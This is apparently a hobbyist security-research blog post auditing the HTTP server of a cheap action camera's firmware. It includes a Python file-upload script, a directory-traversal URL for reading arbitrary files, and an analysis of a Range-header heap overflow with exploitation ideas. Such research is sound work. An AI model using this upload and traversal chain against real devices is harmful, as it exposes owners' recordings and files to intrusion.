In this blog, I'll show you the results of my quick audit of the code responsible for handling the HTTP requests (which was surprisingly well-written). 

Overall, the code quality was decent in terms of preventing stack overflows and integer overflow/underflow issues which was nice to see for Aliexpress rubbish, even uses of **sscanf** were safe! However, there were a couple of slip-ups.

I identified four notable items: two useful exploitation primitives and two issues that I would classify as bugs.

# Memory Read/Write Using **lombo_dump**

While navigating through all of the shell commands, I was beginning to think there wouldn't be any command that would be useful for reading/writing memory. Then I stumbled upon the *lombo_dump* command which does just that!

- To read memory: **lombo_dump dump \*address\***
- To write memory: **lombo_dump write \*address\***

This is very useful for reverse engineering the binary! 

Initially I thought that the write would enable debugging **alloc** and **free** calls, as there are functions in the firmware to add hooks to these functions. However, I couldn't find any memory that was both executable and writable - it seems they are using memory permissions properly to prevent trivial exploitation of stack overflows and other memory corruption.

On the topic of mitigations, there are some functions with stack canaries around, but they don't seem to be in the majority of the firmware.

# File Write using **upload**

I'd have thought that the only use of the hotspot would be to read recorded files, and delete old recordings. It seems the creators of this device didn't agree, and decided to include a file write handler. This could have been for easily uploading files during device testing?

This following Python function will send the specified file to the **/mnt/sdcard** directory on the camera:

```
-python
def upload_file(file_path, filename=None):
    # Define the IP address and port
    ip = "192.168.169.1"
    port = 80

    # Determine the filename and the length of the file
    if filename is None:
        filename = os.path.basename(file_path)
    file_length = str(len(open(file_path, 'rb').read()))

    # Construct the initial POST request headers
    initial_request = f"POST /upload/mnt/sdcard/{file_length} HTTP/1.1\r\n\r\n"

    # Read the file content
    with open(file_path, 'rb') as file:
        file_content = file.read()

    # Construct the file upload POST request headers
    post_request = (
        f"POST /upload/mnt/sdcard/{file_length}?filename=\"/{filename}\" HTTP/1.1\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
    )

    # Construct the additional POST request
    boundary = "---------------------------1723331094431338331860300242"
    additional_post_request = (
        f"POST /upload/mnt/sdcard/{file_length} HTTP/1.1\r\n"
        f"Host: {ip}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {355 + len(file_content)}\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"{boundary}\r\n"
        "Content-Disposition: form-data; name=\"name\"\r\n\r\n"
        "/mnt/sdcard/\r\n"
        f"{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        + file_content.decode('latin1') + "\r\n"
        f"{boundary}--\r\n"
    )

    # Open the socket connection and send the requests
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))

        # Send the initial POST request
        s.sendall(initial_request.encode())
        info("Initial POST request sent.")

        # Send the file upload POST request with the file content
        s.sendall(post_request.encode() + file_content)
        info("File upload POST request sent.")

        # Send the additional POST request
        s.sendall(additional_post_request.encode())
        info("Additional POST request sent.")
```

As seen in the function, the format of the initial request URL being **/upload/mnt/sdcard/*file_length*** is pretty strange. 

# Global Control using **/app/setparamvalue**

The only purpose of this handler is to set a few config parameters, all of them are integers:
- **switchcam**
- **mic** 
- **osd**
- **logo_osd**
- **video_flip**
- **rec_split_duration**
- **encodec**
- **rec**
- **language**

As we can get arbitrary integers into these, it gives us some nice write-to-known-location primitives. Here is an example request:

```
http://192.168.169.1/app/setparamvalue?param=language&value=0
```

# Arb File Read in **/app/get_thumbnail** Handler

Now onto the bugs, the first of which is an arbitrary file read. This is useful for us at this stage as we don't actually have a nice way of getting files out of this filesystem at the moment, and we only have what Binwalk has extracted. This is a nice method to extract any missing files we come across over the network.

## Cause

The cause of this bug is a directory traversal due to weaknesses in checks on the requested file (aggravated by our file write primitive), here is the dodgy code:

![file_read.png](/assets/images/analysing_an_action_camera_part_2/file_read.png)

It checks that the requested file is of the format **/mnt/sdcard/\*date and time\***, as this is the expected format of recording files. If this check passes, it checks that the file extension is valid (**.mp4**, **.mov**, **.TS**, **.jpg**).

If the file ends with one of these extensions, it calls the **http_dnload_file** function, which reads the specified file and sends it back.

We can bypass these checks as they use **strstr()** to check the file extensions.

## Exploitation

All we have to do is upload a file to the SD card using our file write primitive called **test.jpg** for example, then send the following request:

```
http://192.168.169.1/app/getthumbnail/?filename=/mnt/sdcard/test.jpg/../../..{file_path}
```

And the camera responds with the contents of the file specified in *file_path*!

# Heap Overflow in **/mnt** Handler

FINALLY!!! I have been looking for an in-the-wild heap overflow for two years now...

## Cause

This issue is a trivial **strcpy()** overflow into a heap buffer of a fixed size in the **http_dnload_file**. If you have been paying attention you'll notice this was mentioned in the arb file read description, however this bug is not reachable from the **get_thumbnail** handler.

It all starts in the **lb_mnt_handler** function:

![heap_overflow_mnt_function.png](/assets/images/analysing_an_action_camera_part_2/heap_overflow_mnt_function.png)

The above code searches for the **Range: bytes=** string in the HTTP headers, and a pointer to this position gets passed as the 3rd argument of the **download_file_handler** function:

![heap_overflow_download_file_function.png](/assets/images/analysing_an_action_camera_part_2/heap_overflow_download_file_function.png)

The main thing to note here is that the **bytes_range** pointer remains untouched. Next it calls the **http_dnload_file** with the **bytes_range** **char\*** as the third argument.

![heap_overflow_http_dnload_function.png](/assets/images/analysing_an_action_camera_part_2/heap_overflow_http_dnload_function.png)

Now we can see the **malloc(0x144)** call, and the **strcpy()** call into the 64 character **range_string** in the **dnload_heap_struct**. As we can make our range string far larger than 64 bytes, we can overflow this structure on the heap!

## Exploitation

I won't go into a full exploit in this blog (as heap exploits are always a bit tedious), but I will explain the two approaches I was considering after finding this.

### Decrement Primitive

After the 64 byte string in the heap struct, there is a pointer to a "socket" structure, which contains a counter that gets decremented in the thread which is spawned within **http_dnload_file** to handle the request:

![decrement.png](/assets/images/analysing_an_action_camera_part_2/decrement.png)

So we basically just have to overwrite the pointer after the 64 byte range string with the address of what we want to decrement minus 4, then the target address will be decremented - this should be pretty trivial to exploit right?

Well, the issue is that the pointer that actually gets decremented really needs to be decremented, otherwise the connection will not terminate and we basically lose the ability to use that slot again. It looks like there are 13 available slots, as after doing the decrement 13 times we can no longer send in HTTP requests.

So this is actually an arbitrary decrement of at most 13... not as nice :(

### Overflow Adjacent Heap Objects

This is usually the way to go when it comes to heap overflows - provided you have the ability to manipulate the state of the heap to the point where you can force a known object to be next to the object you overflow. This is a well known art, lovingly named heap feng-shui (a.k.a heap grooming).

On operating systems like Linux, where you can debug stuff easily with gdb/lldb, heap exploitation is very challenging. On weird relatively unknown RTOS that probably uses a weird allocator with little debugging it is also pretty challenging...

On the bright side, there definitely won't be the ungodly heap corruption mitigation's such as memory tagging, and hardened allocators like scudo to contend with - so thats good.

# Conclusion

In this blog, we audited the HTTP handlers, which turned out to be a much smaller surface than anticipated. Despite this, we managed to find a couple of useful primitives, and a couple of useful bugs - one of which may allow for remote code execution provided we can conjure up some ungodly exploit.
